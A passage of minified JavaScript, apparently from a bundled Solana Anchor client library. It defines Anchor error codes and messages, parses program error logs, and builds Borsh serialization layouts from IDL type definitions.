      Qf.ANCHOR_ERROR__INVALID_PROGRAM_ID =
      Qf.ANCHOR_ERROR__ACCOUNT_OWNED_BY_WRONG_PROGRAM =
      Qf.ANCHOR_ERROR__ACCOUNT_NOT_MUTABLE =
      Qf.ANCHOR_ERROR__ACCOUNT_NOT_ENOUGH_KEYS =
      Qf.ANCHOR_ERROR__ACCOUNT_DID_NOT_SERIALIZE =
      Qf.ANCHOR_ERROR__ACCOUNT_DID_NOT_DESERIALIZE =
      Qf.ANCHOR_ERROR__ACCOUNT_DISCRIMINATOR_MISMATCH =
      Qf.ANCHOR_ERROR__ACCOUNT_DISCRIMINATOR_NOT_FOUND =
      Qf.ANCHOR_ERROR__ACCOUNT_DISCRIMINATOR_ALREADY_SET =
      Qf.ANCHOR_ERROR__REQUIRE_GTE_VIOLATED =
      Qf.ANCHOR_ERROR__REQUIRE_GT_VIOLATED =
      Qf.ANCHOR_ERROR__REQUIRE_KEYS_NEQ_VIOLATED =
      Qf.ANCHOR_ERROR__REQUIRE_NEQ_VIOLATED =
      Qf.ANCHOR_ERROR__REQUIRE_KEYS_EQ_VIOLATED =
        void 0),
    eh = (Qf.ANCHOR_ERROR__INSTRUCTION_MISSING = 100),
    nh = (Qf.ANCHOR_ERROR__INSTRUCTION_FALLBACK_NOT_FOUND = 101),
    rh = (Qf.ANCHOR_ERROR__INSTRUCTION_DID_NOT_DESERIALIZE = 102),
    oh = (Qf.ANCHOR_ERROR__INSTRUCTION_DID_NOT_SERIALIZE = 103),
    ih = (Qf.ANCHOR_ERROR__IDL_INSTRUCTION_STUB = 1e3),
    sh = (Qf.ANCHOR_ERROR__IDL_INSTRUCTION_INVALID_PROGRAM = 1001),
    ah = (Qf.ANCHOR_ERROR__IDL_ACCOUNT_NOT_EMPTY = 1002),
    uh = (Qf.ANCHOR_ERROR__EVENT_INSTRUCTION_STUB = 1500),
    ch = (Qf.ANCHOR_ERROR__CONSTRAINT_MUT = 2e3),
    lh = (Qf.ANCHOR_ERROR__CONSTRAINT_HAS_ONE = 2001),
    dh = (Qf.ANCHOR_ERROR__CONSTRAINT_SIGNER = 2002),
    fh = (Qf.ANCHOR_ERROR__CONSTRAINT_RAW = 2003),
    hh = (Qf.ANCHOR_ERROR__CONSTRAINT_OWNER = 2004),
    ph = (Qf.ANCHOR_ERROR__CONSTRAINT_RENT_EXEMPT = 2005),
    mh = (Qf.ANCHOR_ERROR__CONSTRAINT_SEEDS = 2006),
    gh = (Qf.ANCHOR_ERROR__CONSTRAINT_EXECUTABLE = 2007),
    yh = (Qf.ANCHOR_ERROR__CONSTRAINT_STATE = 2008),
    wh = (Qf.ANCHOR_ERROR__CONSTRAINT_ASSOCIATED = 2009),
    bh = (Qf.ANCHOR_ERROR__CONSTRAINT_ASSOCIATED_INIT = 2010),
    vh = (Qf.ANCHOR_ERROR__CONSTRAINT_CLOSE = 2011),
    Ah = (Qf.ANCHOR_ERROR__CONSTRAINT_ADDRESS = 2012),
    kh = (Qf.ANCHOR_ERROR__CONSTRAINT_ZERO = 2013),
    Ih = (Qf.ANCHOR_ERROR__CONSTRAINT_TOKEN_MINT = 2014),
    Sh = (Qf.ANCHOR_ERROR__CONSTRAINT_TOKEN_OWNER = 2015),
    _h = (Qf.ANCHOR_ERROR__CONSTRAINT_MINT_MINT_AUTHORITY = 2016),
    Th = (Qf.ANCHOR_ERROR__CONSTRAINT_MINT_FREEZE_AUTHORITY = 2017),
    Ch = (Qf.ANCHOR_ERROR__CONSTRAINT_MINT_DECIMALS = 2018),
    Bh = (Qf.ANCHOR_ERROR__CONSTRAINT_SPACE = 2019),
    Eh = (Qf.ANCHOR_ERROR__CONSTRAINT_ACCOUNT_IS_NONE = 2020),
    xh = (Qf.ANCHOR_ERROR__CONSTRAINT_TOKEN_TOKEN_PROGRAM = 2021),
    Ph = (Qf.ANCHOR_ERROR__CONSTRAINT_MINT_TOKEN_PROGRAM = 2022),
    Rh = (Qf.ANCHOR_ERROR__CONSTRAINT_ASSOCIATED_TOKEN_TOKEN_PROGRAM = 2023),
    Oh = (Qf.ANCHOR_ERROR__CONSTRAINT_MINT_GROUP_POINTER_EXTENSION = 2024),
    Mh =
      (Qf.ANCHOR_ERROR__CONSTRAINT_MINT_GROUP_POINTER_EXTENSION_AUTHORITY = 2025),
    Lh =
      (Qf.ANCHOR_ERROR__CONSTRAINT_MINT_GROUP_POINTER_EXTENSION_GROUP_ADDRESS = 2026),
    Nh =
      (Qf.ANCHOR_ERROR__CONSTRAINT_MINT_GROUP_MEMBER_POINTER_EXTENSION = 2027),
    Dh =
      (Qf.ANCHOR_ERROR__CONSTRAINT_MINT_GROUP_MEMBER_POINTER_EXTENSION_AUTHORITY = 2028),
    Uh =
      (Qf.ANCHOR_ERROR__CONSTRAINT_MINT_GROUP_MEMBER_POINTER_EXTENSION_MEMBER_ADDRESS = 2029),
    qh = (Qf.ANCHOR_ERROR__CONSTRAINT_MINT_METADATA_POINTER_EXTENSION = 2030),
    Wh =
      (Qf.ANCHOR_ERROR__CONSTRAINT_MINT_METADATA_POINTER_EXTENSION_AUTHORITY = 2031),
    zh =
      (Qf.ANCHOR_ERROR__CONSTRAINT_MINT_METADATA_POINTER_EXTENSION_METADATA_ADDRESS = 2032),
    Kh = (Qf.ANCHOR_ERROR__CONSTRAINT_MINT_CLOSE_AUTHORITY_EXTENSION = 2033),
    Fh =
      (Qf.ANCHOR_ERROR__CONSTRAINT_MINT_CLOSE_AUTHORITY_EXTENSION_AUTHORITY = 2034),
    jh = (Qf.ANCHOR_ERROR__CONSTRAINT_MINT_PERMANENT_DELEGATE_EXTENSION = 2035),
    Gh =
      (Qf.ANCHOR_ERROR__CONSTRAINT_MINT_PERMANENT_DELEGATE_EXTENSION_DELEGATE = 2036),
    Vh = (Qf.ANCHOR_ERROR__CONSTRAINT_MINT_TRANSFER_HOOK_EXTENSION = 2037),
    Hh =
      (Qf.ANCHOR_ERROR__CONSTRAINT_MINT_TRANSFER_HOOK_EXTENSION_AUTHORITY = 2038),
    Xh =
      (Qf.ANCHOR_ERROR__CONSTRAINT_MINT_TRANSFER_HOOK_EXTENSION_PROGRAM_ID = 2039),
    Zh = (Qf.ANCHOR_ERROR__REQUIRE_VIOLATED = 2500);
  $f = Qf.ANCHOR_ERROR__REQUIRE_EQ_VIOLATED = 2501;
  var Jh = (Qf.ANCHOR_ERROR__REQUIRE_KEYS_EQ_VIOLATED = 2502),
    Yh = (Qf.ANCHOR_ERROR__REQUIRE_NEQ_VIOLATED = 2503),
    Qh = (Qf.ANCHOR_ERROR__REQUIRE_KEYS_NEQ_VIOLATED = 2504),
    $h = (Qf.ANCHOR_ERROR__REQUIRE_GT_VIOLATED = 2505),
    tp = (Qf.ANCHOR_ERROR__REQUIRE_GTE_VIOLATED = 2506),
    ep = (Qf.ANCHOR_ERROR__ACCOUNT_DISCRIMINATOR_ALREADY_SET = 3e3),
    np = (Qf.ANCHOR_ERROR__ACCOUNT_DISCRIMINATOR_NOT_FOUND = 3001),
    rp = (Qf.ANCHOR_ERROR__ACCOUNT_DISCRIMINATOR_MISMATCH = 3002),
    op = (Qf.ANCHOR_ERROR__ACCOUNT_DID_NOT_DESERIALIZE = 3003),
    ip = (Qf.ANCHOR_ERROR__ACCOUNT_DID_NOT_SERIALIZE = 3004),
    sp = (Qf.ANCHOR_ERROR__ACCOUNT_NOT_ENOUGH_KEYS = 3005),
    ap = (Qf.ANCHOR_ERROR__ACCOUNT_NOT_MUTABLE = 3006),
    up = (Qf.ANCHOR_ERROR__ACCOUNT_OWNED_BY_WRONG_PROGRAM = 3007),
    cp = (Qf.ANCHOR_ERROR__INVALID_PROGRAM_ID = 3008),
    lp = (Qf.ANCHOR_ERROR__INVALID_PROGRAM_EXECUTABLE = 3009),
    dp = (Qf.ANCHOR_ERROR__ACCOUNT_NOT_SIGNER = 3010),
    fp = (Qf.ANCHOR_ERROR__ACCOUNT_NOT_SYSTEM_OWNED = 3011),
    hp = (Qf.ANCHOR_ERROR__ACCOUNT_NOT_INITIALIZED = 3012),
    pp = (Qf.ANCHOR_ERROR__ACCOUNT_NOT_PROGRAM_DATA = 3013),
    mp = (Qf.ANCHOR_ERROR__ACCOUNT_NOT_ASSOCIATED_TOKEN_ACCOUNT = 3014),
    gp = (Qf.ANCHOR_ERROR__ACCOUNT_SYSVAR_MISMATCH = 3015),
    yp = (Qf.ANCHOR_ERROR__ACCOUNT_REALLOC_EXCEEDS_LIMIT = 3016),
    wp = (Qf.ANCHOR_ERROR__ACCOUNT_DUPLICATE_REALLOCS = 3017),
    bp = (Qf.ANCHOR_ERROR__DECLARED_PROGRAM_ID_MISMATCH = 4100),
    vp = (Qf.ANCHOR_ERROR__TRYING_TO_INIT_PAYER_AS_PROGRAM_ACCOUNT = 4101),
    Ap = (Qf.ANCHOR_ERROR__INVALID_NUMERIC_CONVERSION = 4102);
  th = Qf.ANCHOR_ERROR__DEPRECATED = 5e3;
  const kp = new Map();
  function Ip(t) {
    return void 0 !== kp.get(t);
  }
  class Sp extends Error {
    constructor(t) {
      super(t), (this.name = "IdlError");
    }
  }
  class _p {
    constructor(t) {
      this.stack = t;
    }
    static parse(t) {
      var e;
      const n = /^Program (\w*) invoke/,
        r = /^Program \w* success/,
        o = [];
      for (let i = 0; i < t.length; i++) {
        if (r.exec(t[i])) {
          o.pop();
          continue;
        }
        const s = null === (e = n.exec(t[i])) || void 0 === e ? void 0 : e[1];
        s && o.push(new Xi(s));
      }
      return new _p(o);
    }
  }
  class Tp extends Error {
    constructor(t, e, n, r, o, i) {
      super(n.join("\n").replace("Program log: ", "")),
        (this.errorLogs = n),
        (this.logs = r),
        (this.error = {
          errorCode: t,
          errorMessage: e,
          comparedValues: i,
          origin: o,
        }),
        (this._programErrorStack = _p.parse(r));
    }
    static parse(t) {
      if (!t) return null;
      const e = t.findIndex((t) => t.startsWith("Program log: AnchorError"));
      if (-1 === e) return null;
      const n = t[e],
        r = [n];
      let o;
      if (e + 1 < t.length)
        if ("Program log: Left:" === t[e + 1]) {
          const n = /^Program log: (.*)$/,
            i = n.exec(t[e + 2])[1],
            s = n.exec(t[e + 4])[1];
          (o = [new Xi(i), new Xi(s)]), r.push(...t.slice(e + 1, e + 5));
        } else if (t[e + 1].startsWith("Program log: Left:")) {
          const n = /^Program log: (Left|Right): (.*)$/,
            i = n.exec(t[e + 1])[2],
            s = n.exec(t[e + 2])[2];
          r.push(...t.slice(e + 1, e + 3)), (o = [i, s]);
        }
      const i =
          /^Program log: AnchorError occurred\. Error Code: (.*)\. Error Number: (\d*)\. Error Message: (.*)\./.exec(
            n
          ),
        s =
          /^Program log: AnchorError thrown in (.*):(\d*)\. Error Code: (.*)\. Error Number: (\d*)\. Error Message: (.*)\./.exec(
            n
          ),
        a =
          /^Program log: AnchorError caused by account: (.*)\. Error Code: (.*)\. Error Number: (\d*)\. Error Message: (.*)\./.exec(
            n
          );
      if (i) {
        const [e, n, s] = i.slice(1, 4),
          a = { code: e, number: parseInt(n) };
        return new Tp(a, s, r, t, void 0, o);
      }
      if (s) {
        const [e, n, i, a, u] = s.slice(1, 6),
          c = { code: i, number: parseInt(a) },
          l = { file: e, line: parseInt(n) };
        return new Tp(c, u, r, t, l, o);
      }
      if (a) {
        const [e, n, i, s] = a.slice(1, 5),
          u = e,
          c = { code: n, number: parseInt(i) };
        return new Tp(c, s, r, t, u, o);
      }
      return null;
    }
    get program() {
      return this._programErrorStack.stack[
        this._programErrorStack.stack.length - 1
      ];
    }
    get programErrorStack() {
      return this._programErrorStack.stack;
    }
    toString() {
      return this.message;
    }
  }
  class Cp extends Error {
    constructor(t, e, n) {
      super(),
        (this.code = t),
        (this.msg = e),
        (this.logs = n),
        n && (this._programErrorStack = _p.parse(n));
    }
    static parse(t, e) {
      const n = t.toString();
      let r, o;
      if (n.includes("custom program error:")) {
        let t = n.split("custom program error: ");
        if (2 !== t.length) return null;
        r = t[1];
      } else {
        const t = n.match(/"Custom":([0-9]+)}/g);
        if (!t || t.length > 1) return null;
        r = t[0].match(/([0-9]+)/g)[0];
      }
      try {
        o = parseInt(r);
      } catch (s) {
        return null;
      }
      let i = e.get(o);
      return void 0 !== i
        ? new Cp(o, i, t.logs)
        : ((i = xp.get(o)), void 0 !== i ? new Cp(o, i, t.logs) : null);
    }
    get program() {
      var t;
      return null === (t = this._programErrorStack) || void 0 === t
        ? void 0
        : t.stack[this._programErrorStack.stack.length - 1];
    }
    get programErrorStack() {
      var t;
      return null === (t = this._programErrorStack) || void 0 === t
        ? void 0
        : t.stack;
    }
    toString() {
      return this.msg;
    }
  }
  function Bp(t, e) {
    Ip("debug-logs"), 0;
    const n = Tp.parse(t.logs);
    if (n) return n;
    const r = Cp.parse(t, e);
    if (r) return r;
    if (t.logs) {
      const e = {
        get: function (e, n) {
          return "programErrorStack" === n
            ? e.programErrorStack.stack
            : "program" === n
            ? e.programErrorStack.stack[t.programErrorStack.stack.length - 1]
            : Reflect.get(...arguments);
        },
      };
      return (t.programErrorStack = _p.parse(t.logs)), new Proxy(t, e);
    }
    return t;
  }
  const Ep = {
      InstructionMissing: eh,
      InstructionFallbackNotFound: nh,
      InstructionDidNotDeserialize: rh,
      InstructionDidNotSerialize: oh,
      IdlInstructionStub: ih,
      IdlInstructionInvalidProgram: sh,
      IdlAccountNotEmpty: ah,
      EventInstructionStub: uh,
      ConstraintMut: ch,
      ConstraintHasOne: lh,
      ConstraintSigner: dh,
      ConstraintRaw: fh,
      ConstraintOwner: hh,
      ConstraintRentExempt: ph,
      ConstraintSeeds: mh,
      ConstraintExecutable: gh,
      ConstraintState: yh,
      ConstraintAssociated: wh,
      ConstraintAssociatedInit: bh,
      ConstraintClose: vh,
      ConstraintAddress: Ah,
      ConstraintZero: kh,
      ConstraintTokenMint: Ih,
      ConstraintTokenOwner: Sh,
      ConstraintMintMintAuthority: _h,
      ConstraintMintFreezeAuthority: Th,
      ConstraintMintDecimals: Ch,
      ConstraintSpace: Bh,
      ConstraintAccountIsNone: Eh,
      ConstraintTokenTokenProgram: xh,
      ConstraintMintTokenProgram: Ph,
      ConstraintAssociatedTokenTokenProgram: Rh,
      ConstraintMintGroupPointerExtension: Oh,
      ConstraintMintGroupPointerExtensionAuthority: Mh,
      ConstraintMintGroupPointerExtensionGroupAddress: Lh,
      ConstraintMintGroupMemberPointerExtension: Nh,
      ConstraintMintGroupMemberPointerExtensionAuthority: Dh,
      ConstraintMintGroupMemberPointerExtensionMemberAddress: Uh,
      ConstraintMintMetadataPointerExtension: qh,
      ConstraintMintMetadataPointerExtensionAuthority: Wh,
      ConstraintMintMetadataPointerExtensionMetadataAddress: zh,
      ConstraintMintCloseAuthorityExtension: Kh,
      ConstraintMintCloseAuthorityExtensionAuthority: Fh,
      ConstraintMintPermanentDelegateExtension: jh,
      ConstraintMintPermanentDelegateExtensionDelegate: Gh,
      ConstraintMintTransferHookExtension: Vh,
      ConstraintMintTransferHookExtensionAuthority: Hh,
      ConstraintMintTransferHookExtensionProgramId: Xh,
      RequireViolated: Zh,
      RequireEqViolated: $f,
      RequireKeysEqViolated: Jh,
      RequireNeqViolated: Yh,
      RequireKeysNeqViolated: Qh,
      RequireGtViolated: $h,
      RequireGteViolated: tp,
      AccountDiscriminatorAlreadySet: ep,
      AccountDiscriminatorNotFound: np,
      AccountDiscriminatorMismatch: rp,
      AccountDidNotDeserialize: op,
      AccountDidNotSerialize: ip,
      AccountNotEnoughKeys: sp,
      AccountNotMutable: ap,
      AccountOwnedByWrongProgram: up,
      InvalidProgramId: cp,
      InvalidProgramExecutable: lp,
      AccountNotSigner: dp,
      AccountNotSystemOwned: fp,
      AccountNotInitialized: hp,
      AccountNotProgramData: pp,
      AccountNotAssociatedTokenAccount: mp,
      AccountSysvarMismatch: gp,
      AccountReallocExceedsLimit: yp,
      AccountDuplicateReallocs: wp,
      DeclaredProgramIdMismatch: bp,
      TryingToInitPayerAsProgramAccount: vp,
      InvalidNumericConversion: Ap,
      Deprecated: th,
    },
    xp = new Map([
      [Ep.InstructionMissing, "Instruction discriminator not provided"],
      [Ep.InstructionFallbackNotFound, "Fallback functions are not supported"],
      [
        Ep.InstructionDidNotDeserialize,
        "The program could not deserialize the given instruction",
      ],
      [
        Ep.InstructionDidNotSerialize,
        "The program could not serialize the given instruction",
      ],
      [
        Ep.IdlInstructionStub,
        "The program was compiled without idl instructions",
      ],
      [
        Ep.IdlInstructionInvalidProgram,
        "The transaction was given an invalid program for the IDL instruction",
      ],
      [
        Ep.IdlAccountNotEmpty,
        "IDL account must be empty in order to resize, try closing first",
      ],
      [
        Ep.EventInstructionStub,
        "The program was compiled without `event-cpi` feature",
      ],
      [Ep.ConstraintMut, "A mut constraint was violated"],
      [Ep.ConstraintHasOne, "A has one constraint was violated"],
      [Ep.ConstraintSigner, "A signer constraint was violated"],
      [Ep.ConstraintRaw, "A raw constraint was violated"],
      [Ep.ConstraintOwner, "An owner constraint was violated"],
      [Ep.ConstraintRentExempt, "A rent exemption constraint was violated"],
      [Ep.ConstraintSeeds, "A seeds constraint was violated"],
      [Ep.ConstraintExecutable, "An executable constraint was violated"],
      [
        Ep.ConstraintState,
        "Deprecated Error, feel free to replace with something else",
      ],
      [Ep.ConstraintAssociated, "An associated constraint was violated"],
      [
        Ep.ConstraintAssociatedInit,
        "An associated init constraint was violated",
      ],
      [Ep.ConstraintClose, "A close constraint was violated"],
      [Ep.ConstraintAddress, "An address constraint was violated"],
      [Ep.ConstraintZero, "Expected zero account discriminant"],
      [Ep.ConstraintTokenMint, "A token mint constraint was violated"],
      [Ep.ConstraintTokenOwner, "A token owner constraint was violated"],
      [
        Ep.ConstraintMintMintAuthority,
        "A mint mint authority constraint was violated",
      ],
      [
        Ep.ConstraintMintFreezeAuthority,
        "A mint freeze authority constraint was violated",
      ],
      [Ep.ConstraintMintDecimals, "A mint decimals constraint was violated"],
      [Ep.ConstraintSpace, "A space constraint was violated"],
      [
        Ep.ConstraintAccountIsNone,
        "A required account for the constraint is None",
      ],
      [
        Ep.ConstraintTokenTokenProgram,
        "A token account token program constraint was violated",
      ],
      [
        Ep.ConstraintMintTokenProgram,
        "A mint token program constraint was violated",
      ],
      [
        Ep.ConstraintAssociatedTokenTokenProgram,
        "An associated token account token program constraint was violated",
      ],
      [
        Ep.ConstraintMintGroupPointerExtension,
        "A group pointer extension constraint was violated",
      ],
      [
        Ep.ConstraintMintGroupPointerExtensionAuthority,
        "A group pointer extension authority constraint was violated",
      ],
      [
        Ep.ConstraintMintGroupPointerExtensionGroupAddress,
        "A group pointer extension group address constraint was violated",
      ],
      [
        Ep.ConstraintMintGroupMemberPointerExtension,
        "A group member pointer extension constraint was violated",
      ],
      [
        Ep.ConstraintMintGroupMemberPointerExtensionAuthority,
        "A group member pointer extension authority constraint was violated",
      ],
      [
        Ep.ConstraintMintGroupMemberPointerExtensionMemberAddress,
        "A group member pointer extension group address constraint was violated",
      ],
      [
        Ep.ConstraintMintMetadataPointerExtension,
        "A metadata pointer extension constraint was violated",
      ],
      [
        Ep.ConstraintMintMetadataPointerExtensionAuthority,
        "A metadata pointer extension authority constraint was violated",
      ],
      [
        Ep.ConstraintMintMetadataPointerExtensionMetadataAddress,
        "A metadata pointer extension metadata address constraint was violated",
      ],
      [
        Ep.ConstraintMintCloseAuthorityExtension,
        "A close authority constraint was violated",
      ],
      [
        Ep.ConstraintMintCloseAuthorityExtensionAuthority,
        "A close authority extension authority constraint was violated",
      ],
      [
        Ep.ConstraintMintPermanentDelegateExtension,
        "A permanent delegate extension constraint was violated",
      ],
      [
        Ep.ConstraintMintPermanentDelegateExtensionDelegate,
        "A permanent delegate extension delegate constraint was violated",
      ],
      [
        Ep.ConstraintMintTransferHookExtension,
        "A transfer hook extension constraint was violated",
      ],
      [
        Ep.ConstraintMintTransferHookExtensionAuthority,
        "A transfer hook extension authority constraint was violated",
      ],
      [
        Ep.ConstraintMintTransferHookExtensionProgramId,
        "A transfer hook extension transfer hook program id constraint was violated",
      ],
      [Ep.RequireViolated, "A require expression was violated"],
      [Ep.RequireEqViolated, "A require_eq expression was violated"],
      [Ep.RequireKeysEqViolated, "A require_keys_eq expression was violated"],
      [Ep.RequireNeqViolated, "A require_neq expression was violated"],
      [Ep.RequireKeysNeqViolated, "A require_keys_neq expression was violated"],
      [Ep.RequireGtViolated, "A require_gt expression was violated"],
      [Ep.RequireGteViolated, "A require_gte expression was violated"],
      [
        Ep.AccountDiscriminatorAlreadySet,
        "The account discriminator was already set on this account",
      ],
      [
        Ep.AccountDiscriminatorNotFound,
        "No discriminator was found on the account",
      ],
      [
        Ep.AccountDiscriminatorMismatch,
        "Account discriminator did not match what was expected",
      ],
      [Ep.AccountDidNotDeserialize, "Failed to deserialize the account"],
      [Ep.AccountDidNotSerialize, "Failed to serialize the account"],
      [
        Ep.AccountNotEnoughKeys,
        "Not enough account keys given to the instruction",
      ],
      [Ep.AccountNotMutable, "The given account is not mutable"],
      [
        Ep.AccountOwnedByWrongProgram,
        "The given account is owned by a different program than expected",
      ],
      [Ep.InvalidProgramId, "Program ID was not as expected"],
      [Ep.InvalidProgramExecutable, "Program account is not executable"],
      [Ep.AccountNotSigner, "The given account did not sign"],
      [
        Ep.AccountNotSystemOwned,
        "The given account is not owned by the system program",
      ],
      [
        Ep.AccountNotInitialized,
        "The program expected this account to be already initialized",
      ],
      [
        Ep.AccountNotProgramData,
        "The given account is not a program data account",
      ],
      [
        Ep.AccountNotAssociatedTokenAccount,
        "The given account is not the associated token account",
      ],
      [
        Ep.AccountSysvarMismatch,
        "The given public key does not match the required sysvar",
      ],
      [
        Ep.AccountReallocExceedsLimit,
        "The account reallocation exceeds the MAX_PERMITTED_DATA_INCREASE limit",
      ],
      [
        Ep.AccountDuplicateReallocs,
        "The account was duplicated for more than one reallocation",
      ],
      [
        Ep.DeclaredProgramIdMismatch,
        "The declared program id does not match the actual program id",
      ],
      [
        Ep.TryingToInitPayerAsProgramAccount,
        "You cannot/should not initialize the payer account as a program account",
      ],
      [
        Ep.InvalidNumericConversion,
        "The program could not perform the numeric conversion, out of range integral type conversion attempted",
      ],
      [
        Ep.Deprecated,
        "The API being used is deprecated and should no longer be used",
      ],
    ]);
  class Pp {
    static fieldLayout(t, e = [], n) {
      const r = t.name;
      switch (t.type) {
        case "bool":
          return zl.bool(r);
        case "u8":
          return zl.u8(r);
        case "i8":
          return zl.i8(r);
        case "u16":
          return zl.u16(r);
        case "i16":
          return zl.i16(r);
        case "u32":
          return zl.u32(r);
        case "i32":
          return zl.i32(r);
        case "f32":
          return zl.f32(r);
        case "u64":
          return zl.u64(r);
        case "i64":
          return zl.i64(r);
        case "f64":
          return zl.f64(r);
        case "u128":
          return zl.u128(r);
        case "i128":
          return zl.i128(r);
        case "u256":
          return zl.u256(r);
        case "i256":
          return zl.i256(r);
        case "bytes":
          return zl.vecU8(r);
        case "string":
          return zl.str(r);
        case "pubkey":
          return zl.publicKey(r);
        default:
          if ("option" in t.type)
            return zl.option(Pp.fieldLayout({ type: t.type.option }, e, n), r);
          if ("vec" in t.type)
            return zl.vec(Pp.fieldLayout({ type: t.type.vec }, e, n), r);
          if ("array" in t.type) {
            let [o, i] = t.type.array;
            return (
              (i = Pp.resolveArrayLen(i, n)),
              zl.array(Pp.fieldLayout({ type: o }, e, n), i, r)
            );
          }
          if ("defined" in t.type) {
            if (!e) throw new Sp("User defined types not provided");
            const o = t.type.defined.name,
              i = e.find((t) => t.name === o);
            if (!i) throw new Sp(`Type not found: ${t.name}`);
            return Pp.typeDefLayout({
              typeDef: i,
              types: e,
              genericArgs: null != n ? n : t.type.defined.generics,
              name: r,
            });
          }
          if ("generic" in t.type) {
            const r = null == n ? void 0 : n.at(0);
            if ("type" !== (null == r ? void 0 : r.kind))
              throw new Sp(`Invalid generic field: ${t.name}`);
            return Pp.fieldLayout({ ...t, type: r.type }, e);
          }
          throw new Sp(`Not yet implemented: ${JSON.stringify(t.type)}`);
      }
    }
    static typeDefLayout({ typeDef: t, types: e, name: n, genericArgs: r }) {
      switch (t.type.kind) {
        case "struct": {
          const o = mf(
            t.type.fields,
            () => [],
            (n) =>
              n.map((n) => {
                const o = r
                  ? Pp.resolveGenericArgs({
                      type: n.type,
                      typeDef: t,
                      genericArgs: r,
                    })
                  : r;
                return Pp.fieldLayout(n, e, o);
              }),
            (n) =>
              n.map((n, o) => {
                const i = r
                  ? Pp.resolveGenericArgs({
                      type: n,
                      typeDef: t,
                      genericArgs: r,
                    })
                  : r;
                return Pp.fieldLayout({ name: o.toString(), type: n }, e, i);
              })
          );
          return zl.struct(o, n);
        }
        case "enum": {
          const o = t.type.variants.map((n) => {
            const o = mf(
              n.fields,
              () => [],
              (n) =>
                n.map((n) => {
                  const o = r
                    ? Pp.resolveGenericArgs({
                        type: n.type,
                        typeDef: t,
                        genericArgs: r,
                      })
                    : r;
                  return Pp.fieldLayout(n, e, o);
                }),
              (n) =>
                n.map((n, o) => {
                  const i = r
                    ? Pp.resolveGenericArgs({
                        type: n,
                        typeDef: t,
                        genericArgs: r,
                      })
                    : r;
                  return Pp.fieldLayout({ name: o.toString(), type: n }, e, i);
                })
            );
            return zl.struct(o, n.name);
          });
          return void 0 !== n ? zl.rustEnum(o).replicate(n) : zl.rustEnum(o, n);
        }
        case "type":
          return Pp.fieldLayout({ type: t.type.alias, name: n }, e);
      }
    }
    static typeSize(t, e, n) {
      var r;
      switch (t) {
        case "bool":
        case "u8":
        case "i8":
        case "bytes":
        case "string":
          return 1;
        case "i16":
        case "u16":
          return 2;
        case "u32":
        case "i32":
        case "f32":
          return 4;
        case "u64":
        case "i64":
        case "f64":
          return 8;
        case "u128":
        case "i128":
          return 16;
        case "u256":
        case "i256":
        case "pubkey":
          return 32;
        default:
          if ("option" in t) return 1 + Pp.typeSize(t.option, e, n);
          if ("coption" in t) return 4 + Pp.typeSize(t.coption, e, n);
          if ("vec" in t) return 1;
          if ("array" in t) {
            let [r, o] = t.array;
            return (o = Pp.resolveArrayLen(o, n)), Pp.typeSize(r, e, n) * o;
          }
          if ("defined" in t) {
            const o =
              null === (r = e.types) || void 0 === r
                ? void 0
                : r.find((e) => e.name === t.defined.name);
            if (!o) throw new Sp(`Type not found: ${JSON.stringify(t)}`);
            const i = (r) => {
              const i = null != n ? n : t.defined.generics,
                s = i
                  ? Pp.resolveGenericArgs({
                      type: r,
                      typeDef: o,
                      genericArgs: i,
                    })
                  : i;
              return Pp.typeSize(r, e, s);
            };
            switch (o.type.kind) {
              case "struct":
                return mf(
                  o.type.fields,
                  () => [0],
                  (t) => t.map((t) => i(t.type)),
                  (t) => t.map((t) => i(t))
                ).reduce((t, e) => t + e, 0);
              case "enum": {
                const t = o.type.variants.map((t) =>
                  mf(
                    t.fields,
                    () => [0],
                    (t) => t.map((t) => i(t.type)),
                    (t) => t.map((t) => i(t))
                  ).reduce((t, e) => t + e, 0)
                );
                return Math.max(...t) + 1;
              }
              case "type":
                return Pp.typeSize(o.type.alias, e, n);
            }
          }
          if ("generic" in t) {
            const r = null == n ? void 0 : n.at(0);
            if ("type" !== (null == r ? void 0 : r.kind))
              throw new Sp(`Invalid generic: ${t.generic}`);
            return Pp.typeSize(r.type, e, n);
          }
          throw new Error(`Invalid type ${JSON.stringify(t)}`);
      }
    }
    static resolveArrayLen(t, e) {
      if ("number" == typeof t) return t;
      if (e) {
        const n = e.find((t) => "const" === t.kind);
        "const" === (null == n ? void 0 : n.kind) && (t = +n.value);
      }
      if ("number" != typeof t)
        throw new Sp("Generic array length did not resolve");
      return t;
    }
    static resolveGenericArgs({
      type: t,
      typeDef: e,
      genericArgs: n,
      isDefined: r,
    }) {
      if ("object" != typeof t) return null;
      for (const o in e.generics) {
        const i = e.generics[o];
        if ("generic" in t && i.name === t.generic) return [n[o]];
        if ("option" in t) {
          const o = Pp.resolveGenericArgs({
            type: t.option,
            typeDef: e,
            genericArgs: n,
            isDefined: r,
          });
          if (!o || !r) return o;
          if ("type" === o[0].kind)
            return [{ kind: "type", type: { option: o[0].type } }];
        }
        if ("vec" in t) {
          const o = Pp.resolveGenericArgs({
            type: t.vec,
            typeDef: e,
            genericArgs: n,
            isDefined: r,
          });
          if (!o || !r) return o;
          if ("type" === o[0].kind)
            return [{ kind: "type", type: { vec: o[0].type } }];
        }
        if ("array" in t) {
          const [s, a] = t.array,
            u = "object" == typeof a,
            c =
              Pp.resolveGenericArgs({
                type: s,
                typeDef: e,
                genericArgs: n,
                isDefined: r,
              }) || [];
          if (u) {
            const t = e.generics.findIndex((t) => t.name === a.generic);
            -1 !== t && c.push(n[t]);
          }
          if (c.length > 0) {
            if (!r) return c;
            if ("type" === c[0].kind && "const" === c[1].kind)
              return [
                { kind: "type", type: { array: [c[0].type, +c[1].value] } },
              ];
          }
          if (u && i.name === a.generic) {
            const t = n[o];
            return r ? [{ kind: "type", type: { array: [s, +t.value] } }] : [t];
          }
          return null;
        }
        if ("defined" in t)
          return t.defined.generics
            ? t.defined.generics
                .flatMap((t) => {
                  switch (t.kind) {
                    case "type":
                      return Pp.resolveGenericArgs({
                        type: t.type,
                        typeDef: e,
                        genericArgs: n,
                        isDefined: !0,
                      });
                    case "const":
                      return [t];
                  }
                })
                .filter((t) => null !== t)
            : null;
      }
      return null;
    }
  }
  class Rp {
    constructor(t) {
      this.idl = t;
      const e = t.instructions.map((e) => {
        const n = e.name,
          r = e.args.map((e) => Pp.fieldLayout(e, t.types)),
          o = zl.struct(r, n);
        return [n, { discriminator: e.discriminator, layout: o }];
      });
      this.ixLayouts = new Map(e);
    }
    encode(t, e) {
      const n = lt.alloc(1e3),
        r = this.ixLayouts.get(t);
      if (!r) throw new Error(`Unknown method: ${t}`);
      const o = r.layout.encode(e, n),
